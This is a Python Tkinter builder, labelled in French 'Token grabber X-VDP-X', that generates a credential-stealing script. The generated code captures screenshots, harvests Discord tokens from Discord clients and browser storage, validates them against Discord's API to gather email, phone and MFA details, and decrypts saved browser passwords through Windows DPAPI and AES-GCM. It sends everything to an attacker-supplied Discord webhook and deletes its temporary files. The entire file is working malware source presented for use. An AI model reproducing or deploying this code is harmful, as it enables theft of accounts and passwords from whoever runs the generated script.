import tkinter as tk
from tkinter import messagebox
import os

def build_script(webhook, do_screenshot, do_tokens, do_passwords):
    screenshot_code = """
def screenshot():
    try:
        import pyautogui
        img = pyautogui.screenshot()
        img.save("screenshot.png")
        with open("screenshot.png", "rb") as f:
            requests.post(WEBHOOK_URL, files={"file": f})
        os.remove("screenshot.png")
    except:
        pass
""" if do_screenshot else ""

    tokens_code = """
def extract_tokens():
    import re
    import os
    tokens = set()
    paths = {
        "Discord": os.getenv('APPDATA') + r"\\discord",
        "Discord Canary": os.getenv('APPDATA') + r"\\discordcanary",
        "Discord PTB": os.getenv('APPDATA') + r"\\discordptb",
        "Chrome": os.getenv('LOCALAPPDATA') + r"\\Google\\Chrome\\User Data",
        "Opera": os.getenv('APPDATA') + r"\\Opera Software\\Opera Stable",
        "Brave": os.getenv('APPDATA') + r"\\BraveSoftware\\Brave-Browser\\User Data",
        "Yandex": os.getenv('LOCALAPPDATA') + r"\\Yandex\\YandexBrowser\\User Data",
        "Edge": os.getenv('APPDATA') + r"\\Microsoft\\Edge\\User Data",
        "Vivaldi": os.getenv('LOCALAPPDATA') + r"\\Vivaldi\\User Data"
    }
    token_regex = re.compile(r"mfa\\.[\\w-]{84}|[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27,}")
    def search_tokens(folder):
        path = os.path.join(folder, "Local Storage", "leveldb")
        if not os.path.exists(path):
            return
        for file_name in os.listdir(path):
            if not (file_name.endswith(".log") or file_name.endswith(".ldb")):
                continue
            try:
                with open(os.path.join(path, file_name), errors="ignore") as f:
                    content = f.read()
                    for token in token_regex.findall(content):
                        tokens.add(token)
            except:
                continue
    for platform in ["Discord", "Discord Canary", "Discord PTB"]:
        p = paths.get(platform)
        if p and os.path.exists(p):
            search_tokens(p)
    for platform in ["Chrome", "Opera", "Brave", "Yandex", "Edge", "Vivaldi"]:
        base = paths.get(platform)
        if base and os.path.exists(base):
            try:
                for folder in os.listdir(base):
                    full_path = os.path.join(base, folder)
                    if os.path.isdir(full_path):
                        search_tokens(full_path)
            except:
                continue
    return tokens

def get_user_info(token):
    try:
        headers = {"Authorization": token, "Content-Type": "application/json"}
        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=10)
        if r.status_code != 200:
            return None
        data = r.json()
        nitro = "Oui" if data.get("premium_type", 0) in [1,2] else "Non"
        return {
            "ID": data.get("id"),
            "Username": f"{data.get('username')}#{data.get('discriminator')}",
            "Email": data.get("email") or "Aucun",
            "Nitro": nitro,
            "Téléphone": data.get("phone") or "Aucun",
            "MFA Activé": "Oui" if data.get("mfa_enabled") else "Non",
            "Locale": data.get("locale") or "Non renseigné",
            "Vérifié": "Oui" if data.get("verified") else "Non",
            "Token": token,
            "Avatar": f'https://cdn.discordapp.com/avatars/{data.get("id")}/{data.get("avatar")}.png?size=128' if data.get("avatar") else None
        }
    except:
        return None
""" if do_tokens else ""

    passwords_code = """
def get_master_key(browser):
    import json, base64, ctypes, ctypes.wintypes, os
    local_state_paths = {
        "Chrome": os.path.join(os.getenv('LOCALAPPDATA'), "Google", "Chrome", "User Data", "Local State"),
        "Brave": os.path.join(os.getenv('LOCALAPPDATA'), "BraveSoftware", "Brave-Browser", "User Data", "Local State"),
        "Edge": os.path.join(os.getenv('LOCALAPPDATA'), "Microsoft", "Edge", "User Data", "Local State"),
        "Opera": os.path.join(os.getenv('APPDATA'), "Opera Software", "Opera Stable", "Local State"),
        "Vivaldi": os.path.join(os.getenv('LOCALAPPDATA'), "Vivaldi", "User Data", "Local State")
    }
    path = local_state_paths.get(browser)
    if not path or not os.path.exists(path):
        return None
    try:
        with open(path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        class DATA_BLOB(ctypes.Structure):
            _fields_ = [("cbData", ctypes.wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]
        blob_in = DATA_BLOB(len(encrypted_key), ctypes.create_string_buffer(encrypted_key))
        blob_out = DATA_BLOB()
        ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out))
        pointer = ctypes.cast(blob_out.pbData, ctypes.POINTER(ctypes.c_char * blob_out.cbData))
        decrypted_key = pointer.contents.raw
        ctypes.windll.kernel32.LocalFree(blob_out.pbData)
        return decrypted_key
    except:
        return None

def decrypt_password(ciphertext, key):
    try:
        from Crypto.Cipher import AES
        iv = ciphertext[3:15]
        payload = ciphertext[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)[:-16].decode()
        return decrypted_pass
    except:
        return ""

def extract_passwords():
    import shutil, sqlite3, os
    passwords = []
    browsers = {
        "Chrome": os.path.join(os.getenv('LOCALAPPDATA'), "Google", "Chrome", "User Data"),
        "Brave": os.path.join(os.getenv('LOCALAPPDATA'), "BraveSoftware", "Brave-Browser", "User Data"),
        "Edge": os.path.join(os.getenv('LOCALAPPDATA'), "Microsoft", "Edge", "User Data"),
        "Opera": os.path.join(os.getenv('APPDATA'), "Opera Software", "Opera Stable"),
        "Vivaldi": os.path.join(os.getenv('LOCALAPPDATA'), "Vivaldi", "User Data")
    }

    for browser, base_path in browsers.items():
        login_db = os.path.join(base_path, "Default", "Login Data")
        if not os.path.exists(login_db):
            continue
        key = get_master_key(browser)
        if not key:
            continue
        tmp_db = f"tmp_login_{browser}.db"
        try:
            shutil.copy2(login_db, tmp_db)
            conn = sqlite3.connect(tmp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for url, user, encrypted_pass in cursor.fetchall():
                password = decrypt_password(encrypted_pass, key)
                if user or password:
                    passwords.append(f"[{browser}] URL: {url}\\nUtilisateur: {user}\\nMot de passe: {password}\\n---")
            cursor.close()
            conn.close()
            os.remove(tmp_db)
        except:
            continue
    return passwords
""" if do_passwords else ""

    send_passwords_code = """
def send_passwords_file(passwords):
    if not passwords:
        return
    try:
        with open("passwords.txt", "w", encoding="utf-8") as f:
            f.write("\\n".join(passwords))
        with open("passwords.txt", "rb") as f:
            requests.post(WEBHOOK_URL, files={"file": ("passwords.txt", f)})
        os.remove("passwords.txt")
    except:
        pass
""" if do_passwords else ""

    main_code = """
import os
import requests
from datetime import datetime

WEBHOOK_URL = "{webhook}"

{extra_functions}

if __name__ == "__main__":
{do_screenshot_call}
{tokens_process}
{passwords_process}
"""

    do_screenshot_call = "    screenshot()" if do_screenshot else ""
    tokens_process = ""
    passwords_process = ""

    if do_tokens:
        tokens_process = """
    tokens = extract_tokens()
    if tokens:
        valid_infos = []
        seen_ids = set()
        for token in tokens:
            info = get_user_info(token)
            if info and info["ID"] not in seen_ids:
                seen_ids.add(info["ID"])
                valid_infos.append(info)
        if valid_infos:
            embeds = []
            for info in valid_infos:
                embed = {
                    "author": {
                        "name": info["Username"],
                        "icon_url": info["Avatar"] if info["Avatar"] else "https://i.imgur.com/rdm3W9t.png"
                    },
                    "title": "🔎 Compte Discord",
                    "color": 7506394,
                    "fields": [
                        {"name": "🆔 ID", "value": info["ID"], "inline": True},
                        {"name": "📧 Email", "value": info["Email"], "inline": True},
                        {"name": "💎 Nitro", "value": info["Nitro"], "inline": True},
                        {"name": "📞 Téléphone", "value": info["Téléphone"], "inline": True},
                        {"name": "🛡️ MFA Activé", "value": info["MFA Activé"], "inline": True},
                        {"name": "🌐 Locale", "value": info["Locale"], "inline": True},
                        {"name": "✅ Vérifié", "value": info["Vérifié"], "inline": True},
                        {"name": "🔑 Token", "value": f"`{info['Token']}`", "inline": False}
                    ],
                    "footer": {
                        "text": "X-VDP-X",
                        "icon_url": "https://i.postimg.cc/q79gXyTp/image-2.webp"
                    },
                    "timestamp": datetime.utcnow().isoformat()
                }
                embeds.append(embed)
            requests.post(WEBHOOK_URL, json={"content": f"**🎯 {len(valid_infos)} Tokens Discord **", "embeds": embeds})
        else:
            requests.post(WEBHOOK_URL, json={"content": "❌ Aucun token Discord trouvé."})
"""

    if do_passwords:
        passwords_process = """
    passwords = extract_passwords()
    send_passwords_file(passwords)
"""

    extra_functions = "\n".join(filter(None, [screenshot_code, tokens_code, passwords_code, send_passwords_code]))

    full_code = main_code.format(
        webhook=webhook,
        extra_functions=extra_functions,
        do_screenshot_call=do_screenshot_call,
        tokens_process=tokens_process,
        passwords_process=passwords_process
    )

    return full_code

def generate_script():
    webhook = entry_webhook.get().strip()
    if not webhook.startswith("https://discord.com/api/webhooks/"):
        messagebox.showerror("Erreur", "Veuillez entrer un webhook Discord valide.")
        return
    do_screenshot = var_screenshot.get()
    do_tokens = var_tokens.get()
    do_passwords = var_passwords.get()
    if not (do_screenshot or do_tokens or do_passwords):
        messagebox.showerror("Erreur", "Veuillez sélectionner au moins une option.")
        return
    script = build_script(webhook, do_screenshot, do_tokens, do_passwords)
    path = os.path.join(os.getcwd(), "token-grabber.py")
    try:
        with open(path, "w", encoding="utf-8") as f:
            f.write(script)
        messagebox.showinfo("Succès", f"Script généré avec succès dans\n{path}")
    except Exception as e:
        messagebox.showerror("Erreur", f"Impossible d'écrire le fichier : {e}")



root = tk.Tk()
root.title("Token grabber X-VDP-X")
root.geometry("700x360")
root.resizable(False, False)
root.configure(bg="#2c2f33")

LABEL_FONT = ("Segoe UI", 11)
BUTTON_FONT = ("Segoe UI", 11, "bold")
FG_COLOR = "#ffffff"
BG_COLOR = "#2c2f33"
BTN_BG = "#7289da"
BTN_HOVER_BG = "#5b6eae"

frame = tk.Frame(root, bg=BG_COLOR, padx=30, pady=20)
frame.pack(fill="both", expand=True)

lbl_webhook = tk.Label(frame, text="Webhook Discord :", font=LABEL_FONT, fg=FG_COLOR, bg=BG_COLOR)
lbl_webhook.grid(row=0, column=0, sticky="w")
entry_webhook = tk.Entry(frame, width=80, font=LABEL_FONT)
entry_webhook.grid(row=1, column=0, columnspan=3, pady=(0, 20))

options_frame = tk.LabelFrame(frame, text="Options à inclure", fg=FG_COLOR, bg=BG_COLOR, font=LABEL_FONT, labelanchor="n", padx=15, pady=10)
options_frame.grid(row=2, column=0, columnspan=3, sticky="ew", pady=(0, 20))

var_screenshot = tk.BooleanVar()
var_tokens = tk.BooleanVar()
var_passwords = tk.BooleanVar()

cb_screenshot = tk.Checkbutton(options_frame, text="📸 Capture d'écran", variable=var_screenshot, fg=FG_COLOR, bg=BG_COLOR, selectcolor=BG_COLOR, font=LABEL_FONT, activebackground=BG_COLOR)
cb_tokens = tk.Checkbutton(options_frame, text="🎟️ Tokens Discord", variable=var_tokens, fg=FG_COLOR, bg=BG_COLOR, selectcolor=BG_COLOR, font=LABEL_FONT, activebackground=BG_COLOR)
cb_passwords = tk.Checkbutton(options_frame, text="🔐 Mots de passe ", variable=var_passwords, fg=FG_COLOR, bg=BG_COLOR, selectcolor=BG_COLOR, font=LABEL_FONT, activebackground=BG_COLOR)

cb_screenshot.grid(row=0, column=0, sticky="w", padx=15, pady=5)
cb_tokens.grid(row=0, column=1, sticky="w", padx=15, pady=5)
cb_passwords.grid(row=0, column=2, sticky="w", padx=15, pady=5)

btn_generate = tk.Button(frame, text="🛠️ Générer le script", font=BUTTON_FONT, bg=BTN_BG, fg=FG_COLOR, activebackground=BTN_HOVER_BG, activeforeground=FG_COLOR, cursor="hand2", command=generate_script)
btn_generate.grid(row=3, column=0, columnspan=3, pady=(10, 0), ipadx=20, ipady=8)

root.mainloop()
